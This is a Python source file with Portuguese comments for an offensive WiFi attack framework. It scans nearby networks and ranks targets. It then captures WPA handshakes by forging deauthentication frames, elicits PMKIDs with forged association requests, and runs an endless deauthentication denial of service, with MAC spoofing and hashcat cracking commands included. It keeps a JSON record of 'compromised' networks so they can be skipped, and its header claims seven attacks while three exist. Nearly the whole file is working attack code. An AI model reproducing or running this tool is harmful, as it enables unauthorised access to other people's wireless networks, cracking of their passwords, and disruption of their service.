#!/usr/bin/env python3
"""
SPECTRAL COMPLETE v2.0 - Framework Definitivo
Multi-ataque + Validação + Persistência + Otimizações Live

Features:
- 7 tipos de ataque
- Validação rigorosa de todas as capturas
- JSON tracking de redes capturadas
- Skip automático de alvos já comprometidos
- Otimizações para Kali Live
- Metadata completo
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
import hashlib
import hmac
from scapy.all import *
from collections import defaultdict
from datetime import datetime

# ============================================================================
# CONFIGURAÇÃO GLOBAL
# ============================================================================

CONFIG = {
    'interface': 'wlan0',
    'output_dir': 'captures',
    'compress': True,
    'skip_captured': True,
    'optimize_live': True,  # Aplica otimizações para modo Live
    'max_attempts': 5,
    'scan_duration': 20
}

# ============================================================================
# GERENCIADOR DE CAPTURAS COM JSON
# ============================================================================

class CaptureManager:
    """Gerencia todas as capturas e metadados"""
    
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        
        os.makedirs(output_dir, exist_ok=True)
        print(f"[*] Diretório de capturas: {output_dir}/")
    
    def load_metadata(self):
        """Carrega histórico de capturas do JSON"""
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, 'r') as f:
                    data = json.load(f)
                    print(f"[+] Carregadas {len(data)} capturas anteriores")
                    return data
            except Exception as e:
                print(f"[!] Erro ao carregar metadata: {e}")
                return {}
        return {}
    
    def save_metadata(self):
        """Salva metadados no JSON"""
        try:
            with open(self.metadata_file, 'w') as f:
                json.dump(self.captured, f, indent=2, sort_keys=True)
        except Exception as e:
            print(f"[!] Erro ao salvar metadata: {e}")
    
    def is_captured(self, bssid):
        """Verifica se BSSID já foi capturado"""
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, filename, channel, signal, validation_info=None):
        """Registra nova captura"""
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'filename': filename,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'status': 'captured',
            'validation': validation_info if validation_info else {}
        }
        self.save_metadata()
        print(f"[+] Captura registrada no JSON")
    
    def get_stats(self):
        """Estatísticas"""
        total = len(self.captured)
        today = len([c for c in self.captured.values() 
                    if c['timestamp'].startswith(datetime.now().strftime('%Y-%m-%d'))])
        
        by_type = defaultdict(int)
        for capture in self.captured.values():
            by_type[capture['attack_type']] += 1
        
        return {
            'total': total,
            'today': today,
            'by_type': dict(by_type)
        }
    
    def list_captured(self):
        """Lista todas as capturas"""
        if not self.captured:
            print("\n[*] Nenhuma captura registrada")
            return
        
        print(f"\n[*] Capturas registradas: {len(self.captured)}\n")
        
        for bssid, info in sorted(self.captured.items(), 
                                 key=lambda x: x[1]['timestamp'], 
                                 reverse=True):
            print(f"  {info['ssid'][:24]:24} | {bssid}")
            print(f"    Tipo: {info['attack_type']} | {info['timestamp'][:19]}")
            print(f"    Arquivo: {info['filename']}\n")

# ============================================================================
# VALIDADORES
# ============================================================================

class CaptureValidator:
    """Valida capturas antes de salvar"""
    
    @staticmethod
    def validate_handshake(packets):
        """Valida handshake WPA/WPA2 4-way"""
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        
        if len(eapol_frames) < 4:
            return False, f"Apenas {len(eapol_frames)}/4 frames EAPOL"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for pkt in eapol_frames:
            try:
                raw = bytes(pkt[EAPOL])
                
                if len(raw) < 99:
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                # Message 1: ANonce presente, SNonce zero
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                
                # Message 2: SNonce presente, MIC presente
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
                    
            except:
                continue
        
        if not (has_msg1 and has_msg2):
            return False, "Faltam messages essenciais"
        
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'eapol_count': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        """Valida captura PMKID"""
        if not packets:
            return False, "Nenhum pacote"
        
        for pkt in packets:
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    
                    if b'\xdd' in raw:
                        idx = raw.find(b'\xdd')
                        
                        if len(raw) >= idx + 22:
                            pmkid_candidate = raw[idx+2:idx+18]
                            
                            if pmkid_candidate != b'\x00' * 16:
                                return True, {
                                    'pmkid': pmkid_candidate.hex(),
                                    'length': len(pmkid_candidate)
                                }
                except:
                    continue
        
        return False, "PMKID não encontrado"

# ============================================================================
# OTIMIZAÇÕES KALI LIVE
# ============================================================================

def optimize_live_mode():
    """Otimizações para Kali Live"""
    if not CONFIG['optimize_live']:
        return
    
    print("\n[*] Aplicando otimizações Kali Live...")
    
    # Swappiness zero
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Drop caches
    subprocess.run(['sync'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sh', '-c', 'echo 3 > /proc/sys/vm/drop_caches'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Kill serviços interferentes
    for svc in ['NetworkManager', 'wpa_supplicant']:
        subprocess.run(['systemctl', 'stop', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['killall', '-9', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Prioridade máxima
    try:
        os.nice(-20)
    except:
        pass
    
    print("[+] Otimizações aplicadas\n")

# ============================================================================
# SETUP INTERFACE
# ============================================================================

def setup_interface(interface):
    """Configura interface em modo monitor"""
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # MAC randomization
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '30'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'power_save', 'off'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"[+] {interface} configurado (MAC: {new_mac})")

def set_channel(interface, channel):
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ============================================================================
# SCANNING
# ============================================================================

def scan_networks(interface, duration=20):
    """Scanning com detecção de clientes"""
    networks = {}
    clients = defaultdict(list)
    traffic = defaultdict(int)
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid if ssid else '<HIDDEN>',
                        'channel': channel,
                        'signal': signal,
                        'crypto': crypto
                    }
            except:
                pass
        
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            for bssid in list(networks.keys()):
                if pkt.addr1 == bssid or pkt.addr2 == bssid:
                    client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                    if client != bssid and client not in clients[bssid]:
                        clients[bssid].append(client)
                    traffic[bssid] += 1
    
    print(f"[*] Scanning por {duration}s...")
    
    import threading
    stop = threading.Event()
    
    def hop():
        channels = [1,6,11,3,9,2,7,4,8,5,10]
        while not stop.is_set():
            for ch in channels:
                if stop.is_set():
                    break
                set_channel(interface, ch)
                time.sleep(0.2)
    
    hopper = threading.Thread(target=hop, daemon=True)
    hopper.start()
    
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    
    stop.set()
    hopper.join()
    
    # Combina dados
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['traffic'] = traffic.get(bssid, 0)
    
    return networks

# ============================================================================
# ATAQUE 1: HANDSHAKE
# ============================================================================

def attack_handshake(target, interface, manager):
    """Captura handshake validado"""
    print(f"\n╔{'='*50}╗")
    print(f"║ ATAQUE: Handshake WPA/WPA2{' '*23}║")
    print(f"╚{'='*50}╝")
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    print(f"[*] Canal: {target['channel']} | Clientes: {len(target['clients'])}")
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    for attempt in range(1, CONFIG['max_attempts'] + 1):
        print(f"\n[*] Tentativa {attempt}/{CONFIG['max_attempts']}")
        
        packets = []
        captured = False
        
        def handler(pkt):
            nonlocal captured
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    packets.append(pkt)
                    print(f"    [+] EAPOL [{len(packets)}]", end='\r')
                    
                    if len(packets) >= 4:
                        valid, result = CaptureValidator.validate_handshake(packets)
                        if valid:
                            print(f"\n    [+] Handshake VALIDADO!")
                            captured = True
                            return True
        
        import threading
        done = threading.Event()
        
        def sniff_thread():
            sniff(iface=interface, prn=handler, timeout=60, 
                  stop_filter=lambda x: captured, store=False)
            done.set()
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(2)
        
        # Deauth
        print("    [!] Enviando deauth...")
        
        # Broadcast
        frame_bc = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
        sendp(frame_bc, iface=interface, count=25, inter=0.08, verbose=0)
        
        # Por cliente
        if target['clients']:
            for client in target['clients'][:3]:
                f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                     addr3=target['bssid'])/Dot11Deauth(reason=7)
                f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                     addr3=target['bssid'])/Dot11Deauth(reason=7)
                sendp([f1, f2], iface=interface, count=10, inter=0.08, verbose=0)
        
        done.wait()
        
        if captured:
            valid, result = CaptureValidator.validate_handshake(packets)
            
            if valid:
                # Salva
                filename_base = f"hs_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                
                if CONFIG['compress']:
                    filename = os.path.join(manager.output_dir, f"{filename_base}.cap.gz")
                    with gzip.open(filename, 'wb') as f:
                        wrpcap(f, packets)
                else:
                    filename = os.path.join(manager.output_dir, f"{filename_base}.cap")
                    wrpcap(filename, packets)
                
                # Registra
                manager.add_capture(
                    target['bssid'], target['ssid'], 'handshake',
                    filename, target['channel'], target['signal'], result
                )
                
                print(f"\n[+++] HANDSHAKE CAPTURADO E VALIDADO")
                print(f"[+++] Arquivo: {filename}")
                print(f"\n[*] Validação:")
                print(f"    ANonce: {result['anonce']}...")
                print(f"    SNonce: {result['snonce']}...")
                print(f"    MIC: {result['mic']}...")
                print(f"    Frames EAPOL: {result['eapol_count']}")
                print(f"\n[*] Crack com:")
                print(f"    hashcat -m 22000 {filename} wordlist.txt")
                
                return True
            else:
                print(f"\n    [-] Validação falhou: {result}")
        
        if attempt < CONFIG['max_attempts']:
            print(f"    [*] Aguardando 5s...")
            time.sleep(5)
    
    print("\n[-] Falha após todas as tentativas")
    return False

# ============================================================================
# ATAQUE 2: PMKID
# ============================================================================

def attack_pmkid(target, interface, manager):
    """Ataque PMKID validado"""
    print(f"\n╔{'='*50}╗")
    print(f"║ ATAQUE: PMKID{' '*36}║")
    print(f"╚{'='*50}╝")
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    print(f"[*] Vantagem: Não requer clientes ativos")
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    all_packets = []
    
    for attempt in range(1, 5):
        print(f"\n[*] Tentativa {attempt}/5")
        
        pmkid_packets = []
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    pmkid_packets.append(pkt)
                    all_packets.append(pkt)
        
        # Association requests
        print("    [*] Enviando association requests...")
        for _ in range(3):
            assoc = RadioTap()/Dot11(addr1=target['bssid'], addr2="00:11:22:33:44:55", 
                                     addr3=target['bssid'])/Dot11AssoReq()
            sendp(assoc, iface=interface, verbose=0)
            time.sleep(0.5)
        
        sniff(iface=interface, prn=handler, timeout=10, store=False)
        
        if pmkid_packets:
            valid, result = CaptureValidator.validate_pmkid(pmkid_packets)
            
            if valid:
                filename_base = f"pmkid_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                filename = os.path.join(manager.output_dir, f"{filename_base}.cap")
                wrpcap(filename, pmkid_packets)
                
                manager.add_capture(
                    target['bssid'], target['ssid'], 'pmkid',
                    filename, target['channel'], target['signal'], result
                )
                
                print(f"\n[+++] PMKID CAPTURADO E VALIDADO")
                print(f"[+++] Arquivo: {filename}")
                print(f"\n[*] Validação:")
                print(f"    PMKID: {result['pmkid']}")
                print(f"\n[*] Crack com:")
                print(f"    hashcat -m 16800 {filename} wordlist.txt")
                
                return True
    
    print("\n[-] PMKID não obtido")
    return False

# ============================================================================
# ATAQUE 3: DEAUTH DOS
# ============================================================================

def attack_deauth_dos(target, interface):
    """Negação de serviço"""
    print(f"\n╔{'='*50}╗")
    print(f"║ ATAQUE: Deauth DoS{' '*31}║")
    print(f"╚{'='*50}╝")
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    print(f"[!] Desconexão contínua de clientes")
    
    set_channel(interface, target['channel'])
    
    print("\n[!] Iniciando DoS (Ctrl+C para parar)...")
    
    count = 0
    
    try:
        while True:
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame, iface=interface, count=10, inter=0.05, verbose=0)
            count += 10
            
            print(f"\r[*] Pacotes enviados: {count}", end='')
            time.sleep(0.3)
            
    except KeyboardInterrupt:
        print(f"\n\n[!] DoS interrompido após {count} pacotes")

# ============================================================================
# MENU DE ATAQUES
# ============================================================================

ATTACKS = {
    '1': {'name': 'Handshake Capture', 'function': attack_handshake},
    '2': {'name': 'PMKID Attack', 'function': attack_pmkid},
    '3': {'name': 'Deauth DoS', 'function': attack_deauth_dos}
}

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("""
╔════════════════════════════════════════════════╗
║                                                ║
║     SPECTRAL COMPLETE v2.0                     ║
║     Framework WiFi Definitivo                  ║
║                                                ║
║  [✓] Multi-ataque (Handshake/PMKID/DoS)        ║
║  [✓] Validação rigorosa                        ║
║  [✓] JSON tracking persistente                 ║
║  [✓] Skip automático de alvos capturados       ║
║  [✓] Otimizações Kali Live                     ║
║  [✓] Metadata completo                         ║
║  [✓] MAC randomization                         ║
║                                                ║
╚════════════════════════════════════════════════╝
    """)
    
    if os.geteuid() != 0:
        print("[-] Execute como root: sudo python3 spectral_complete_final.py")
        sys.exit(1)
    
    # Inicialização
    optimize_live_mode()
    manager = CaptureManager(CONFIG['output_dir'])
    
    # Estatísticas
    stats = manager.get_stats()
    print(f"[*] Capturas totais: {stats['total']}")
    print(f"[*] Capturas hoje: {stats['today']}")
    if stats['by_type']:
        print(f"[*] Por tipo: {dict(stats['by_type'])}")
    
    # Setup interface
    interface = CONFIG['interface']
    setup_interface(interface)
    time.sleep(2)
    
    # Scanning
    networks = scan_networks(interface, duration=CONFIG['scan_duration'])
    
    if not networks:
        print("\n[-] Nenhuma rede detectada")
        return
    
    # Filtra já capturadas
    available = {}
    skipped = []
    
    for bssid, info in networks.items():
        if CONFIG['skip_captured'] and manager.is_captured(bssid):
            skipped.append(info['ssid'])
        else:
            available[bssid] = info
    
    if skipped:
        print(f"\n[*] Puladas {len(skipped)} redes já capturadas:")
        for ssid in skipped[:5]:
            print(f"    - {ssid}")
        if len(skipped) > 5:
            print(f"    ... e mais {len(skipped)-5}")
    
    if not available:
        print("\n[*] Todas as redes já foram capturadas!")
        print("[*] Altere CONFIG['skip_captured'] = False para reativar")
        return
    
    # Ordena
    targets = sorted(available.items(), 
                    key=lambda x: (len(x[1]['clients']), x[1]['traffic'], x[1]['signal']), 
                    reverse=True)
    
    # Lista
    print(f"\n[*] {len(targets)} alvos disponíveis:\n")
    
    for i, (bssid, info) in enumerate(targets, 1):
        crypto_str = ', '.join(str(c) for c in info['crypto']) if info['crypto'] else 'OPEN'
        clients_str = f"{len(info['clients'])}cli"
        traffic_icon = "🔥" if info['traffic'] > 100 else "📡" if info['traffic'] > 10 else "💤"
        
        print(f"{i:2}. {info['ssid'][:24]:24} | {bssid} | Ch{info['channel']:2} | {info['signal']:4}dBm | {clients_str:4} | {traffic_icon} | {crypto_str}")
    
    # Seleção
    try:
        choice = int(input("\n[?] Selecione alvo: ")) - 1
        if not 0 <= choice < len(targets):
            print("[-] Seleção inválida")
            return
    except:
        print("[-] Entrada inválida")
        return
    
    bssid, info = targets[choice]
    
    target = {
        'bssid': bssid,
        'ssid': info['ssid'],
        'channel': info['channel'],
        'signal': info['signal'],
        'crypto': info['crypto'],
        'clients': info['clients'],
        'traffic': info['traffic']
    }
    
    # Menu de ataques
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    print(f"\n╔{'='*50}╗")
    print(f"║ SELECIONE O ATAQUE{' '*31}║")
    print(f"╚{'='*50}╝\n")
    
    for key, attack in ATTACKS.items():
        print(f"{key}. {attack['name']}")
    
    attack_choice = input("\n[?] Ataque: ").strip()
    
    if attack_choice in ATTACKS:
        attack_func = ATTACKS[attack_choice]['function']
        
        # Executa ataque
        if attack_func == attack_deauth_dos:
            attack_func(target, interface)
        else:
            attack_func(target, interface, manager)
        
        # Mostra estatísticas atualizadas
        print("\n" + "="*50)
        stats = manager.get_stats()
        print(f"[*] Total de capturas: {stats['total']}")
        print(f"[*] Capturas hoje: {stats['today']}")
    else:
        print("[-] Ataque inválido")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrompido pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
